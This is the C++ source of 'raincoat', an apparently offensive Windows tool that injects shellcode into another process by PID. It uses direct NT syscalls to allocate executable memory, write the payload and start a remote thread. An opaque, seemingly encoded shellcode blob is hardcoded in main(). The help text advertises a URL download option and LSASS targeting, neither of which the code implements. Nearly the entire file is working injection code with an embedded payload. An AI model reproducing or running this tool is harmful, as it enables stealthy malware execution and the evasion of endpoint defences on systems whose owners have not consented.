#include <iostream>
#include <fstream>
#include <string.h>
#include "syscalls.h"
#include <stdio.h>
#include <wininet.h>
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#define UNICODE 1
#pragma comment(lib, "ntdll")
#pragma comment(lib, "wininet.lib")
#pragma warning(disable : 4996) 
char shellcode[5000];



int injectShellcode(int PID, char* shellcode, size_t shellsize) {
    LPVOID allocation_start;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPCSTR cmd;
    SIZE_T RegionSize = (SIZE_T)shellsize;
    HANDLE hThread;
    HANDLE procHandle;
    SIZE_T            wr;
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    LARGE_INTEGER     li;
    PVOID            ds = NULL;



    if (PID != 0) {
        printf("[*] Injecting into remote process using direct syscalls\n\n");
        procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
        NtAllocateVirtualMemory(procHandle, &ds, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        NtWriteVirtualMemory(procHandle, ds, shellcode, shellsize, &wr);
        NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oa, procHandle, ds, ds, FALSE, 0, 0, 0, NULL);
        if (hThread != NULL) {

            li.QuadPart = INFINITE;
            NtWaitForSingleObject(hThread, FALSE, &li);
            LPVOID* ds = NULL;
            NtClose(hThread);
            NtFreeVirtualMemory(procHandle, ds, 0, MEM_RELEASE | MEM_DECOMMIT);
            NtClose(procHandle);
            printf("[+] Injected into remote process\n\n");

            return 0;
        }
    }

}




int main(int argc, char* argv[]) {
    using namespace std::literals;

    printf("\nraincoat by liz & ellyysium \n\n");
    printf("\n@ellyysium & @realhaxorleet \n\n");
    int PID = 0;
    if (argc < 2) {
        printf("[-] Error: No flags given. Use -h to view help page\n");
        return 0;
    }

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            printf("Usage: raincoat.exe -url <url with raw shellcode> [-lsass | -pid <num>]\n\n");
            printf("-pid <num>: inject into remote process given PID\n");
            return 0;
        }

        if (strcmp(argv[i], "-pid") == 0) {
            PID = atoi(argv[i + 1]);
        }
        else if (argv[i] == NULL) {
            printf("you should setup a pid\n");
            return -1;
        }


    }
    char shellcode[5000] = "\xeb\x01\x4f\xe8\xce\x02\x00\x00\xd9\xe5\xeb\x01\x6e\xbe\x4c\x8c\xb7\x70\x1c\xec\x2a\xaa\x4c\xd3\x5d\xc2\xf6\xff\xff\x00\x44\x30\x1c\x0f\x44\x02\x1c\x0f\xe2\xf6\xda\x87\x06\xbd\xb3\x4f\x07\x44\x40\x20\x30\xfc\xfc\xfc\xfa\x3b\x68\x89\xd5\x67\xb6\xd0\x56\x47\x55\xa0\xd6\x59\xcb\x2b\x53\xd4\x76\x6e\x10\x1b\x09\x91\x9a\x2b\xd2\x84\xef\x1d\x4d\xf9\x88\xbf\xe1\x2b\x03\xb2\x6a\xb6\x48\xd1\xa9\x53\x7f\x5f\x9c\x5d\x8a\x07\x44\x45\x40\x58\x31\x63\x80\xc1\x75\xfe\xac\x8a\xfd\xbf\x73\x3b\xba\x62\x02\x73\xeb\xe3\xe4\xd8\xd7\x92\xe0\xe0\xe0\xde\x55\xc5\x4d\x4d\x4d\x4d\x05\x00\x38\x82\xd5\x9d\x1c\xcc\x76\xfd\xbd\x99\x82\xaa\x20\x69\x48\x18\x86\x59\x8f\x37\x36\xff\xb0\x71\x36\x67\x8c\xb8\xa0\xe6\xc7\x81\xa9\x18\x80\xaa\xeb\xa8\x59\x52\x13\x90\x21\xd9\xb1\x22\xcb\x87\x74\x30\x04\x82\xb7\x6c\x3d\xa8\x40\x90\xc2\x49\xc1\xd5\x9a\x1b\x03\x65\x12\x81\x0d\x45\xfd\x76\x06\x98\xd1\xd0\xfe\xbf\x34\x20\x28\x5e\x5f\x0f\xae\xf4\x05\xa1\xff\x16\x4a\xeb\x33\x40\x99\x24\x7e\x30\x2b\x87\x27\x46\xea\xd5\x85\xdd\x1a\xb3\xe9\x9d\x16\xf2\x9b\x2e\x2d\x2c\x2b\x66\xcc\xf9\x9c\xcf\x76\x26\x81\x14\x78\xcd\x5b\xbe\xca\xc8\x65\xa3\xeb\x60\x71\xb6\x6d\x2f\x9b\xe0\xb8\x3f\x3e\xcb\x16\xb5\xfd\x72\x13\xbc\xd4\x59\x68\x16\x1b\xa8\x5d\xe8\x3b\x02\x44\x7e\xd6\xaf\x08\x08\x08\x08\xf6\xe1\xa4\x2c\x3c\x3c\x3c\x3a\xeb\x92\x5c\x70\x3d\xeb\x8b\x41\x73\x21\xcd\x83\xb2\x70\x48\xb4\xee\x94\x9d\x5a\x8b\x4c\x6a\x51\x71\x71\x69\xc2\xe3\x84\xd7\x70\x14\x97\x32\x7b\x3d\x68\xdd\xba\x7c\x7c\x7c\x7c\x82\x7d\x28\xbe\x1f\x1f\x1f\xdf\xce\x1f\x82\xe8\x20\x99\xf0\x47\xa5\x33\x73\xd4\x25\xaf\x14\x6d\x83\xad\x58\x53\xda\x4b\xb0\xc6\x10\x44\x8d\xc8\x7e\xcd\xf9\x56\xa7\x08\x60\xc4\x06\x92\xe7\x1a\x45\xe6\x69\xbe\x92\x13\x1b\xda\x3a\x33\xe8\xc1\x0d\xbe\x2d\x58\xf0\x15\x57\xf8\x05\xb6\xdf\x67\xa1\x94\x42\x8e\x17\x90\xe5\x17\x5a\xfc\x3c\x6d\x88\x0c\x4f\xdb\x85\x27\xa8\xe5\x28\x21\x8d\x23\x77\xb6\xe8\x5b\xbf\x93\x3e\x76\x8d\x3a\x6a\xf9\x27\x6d\x85\x0a\x0e\xa6\xd4\x00\x4f\xfe\x19\x83\x85\x35\xba\xed\x78\x2c\x98\x3c\x62\x84\x26\x7c\xd1\x1e\x07\xb4\xc8\x6a\xd9\x0c\x54\xfd\x67\xb3\x2d\x5e\x8a\x2e\x7e\xa2\xe5\x13\x5a\xee\x39\x02\xa0\x33\x9c\xe5\x5a\x77\xbe\x09\x7e\xb8\xda\x94\x04\x4a\xc3\xfc\x0f\x55\xe4\x22\x0f\xbc\x71\x92\x9a\x22\x22\xd0\xf0\x74\x74\x74\x74\x74\x82\x2d\x7c\xa9\x6e\x2a\x39\x10\x38\xfb\xfa\xaf\xd7\x5e\x44\x2e\x9a\x21\x42\x98\xce\xa7\x44\xe9\xc6\x8f\xa0\x01\x26\x71\x90\xd5\x92\x0e\x1b\x1d\xf1\x74\x63\xb4\xb1\x89\xc2\xdd\x09\xcc\x0d\x61\x72\x72\x60\xd5\x6f\xcb\x33\xc6\x26\x26\x26\x26\xd8\x87\x42\xf4\xf3\xbc\xc4\x30\xc3\xcf\x87\xd2\xd2\xd2\x2c\x7f\xd6\x3c\x78\x90\xd9\xae\x7f\x3e\xdc\xca\x7b\x3c\xfc\xfc\xec\xec\xea\x53\xc9\x49\xc9\x50\xb5\xb5\xb5\xb5\x49\x34\xd1\x95\xe0\x33\x50\x06\x4f\x28\x5e\x17\xd6\x9c\xe1\xbb\xec\xab\x6b\x6b\x4b\x4b\x4b\xf0\x79\x7e\xc7\x79\x43\xc5\x88\x6a\x6a\x6a\x6a\x94\x43\x06\x48\xc3\xc7\xe7\x62\x5a\xce\x70\x00\x83\x74\x3a\xbb\x76\xf3\xcb\x3e\xcc\x12\x21\x65\x0f\xef\x24\x61\x26\x04\x8a\x3f\x11\xb7\xa6\x48\x8b\x34\x24\x48\x83\xec\x08\xeb\x01\xc1\x4d\x85\xc9\xf7\x56\x05\x4d\x0f\x47\xe4\xeb\x01\xfa\xc1\x46\x09\x5c\x81\x46\x0d\x56\xb3\x74\x2f\x48\x0f\x45\xc0\xf7\x56\x11\x56\xc3";
    injectShellcode(PID, shellcode, sizeof(shellcode));

    return 0;
}
